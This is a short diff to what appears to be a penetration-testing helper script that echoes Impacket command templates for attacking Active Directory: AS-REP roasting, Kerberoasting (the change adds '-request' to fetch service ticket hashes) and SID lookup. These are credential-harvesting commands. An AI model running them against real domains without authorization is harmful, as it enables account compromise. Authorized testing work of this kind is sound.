@@ -316,7 +316,7 @@ echo -e "GetNPUsers.py $Domain -usersfile $UserList -dc-ip $IP -format 'hashcat'
 echo -e "GetNPUsers.py $NQDomain/$NQUsername:$Password -request -dc-ip $IP -format 'hashcat'"
 echo -e ""
 echo -e "${IBLUE}GetUserSPNs${RESTORE}"
-echo -e "GetUserSPNs.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e "GetUserSPNs.py $NQDomain/$NQUsername:$Password -dc-ip $IP -request"
 echo -e ""
 echo -e "${IBLUE}lookupsid${RESTORE}"
 echo -e "lookupsid.py $NQDomain/$NQUsername:$Password@$IP"
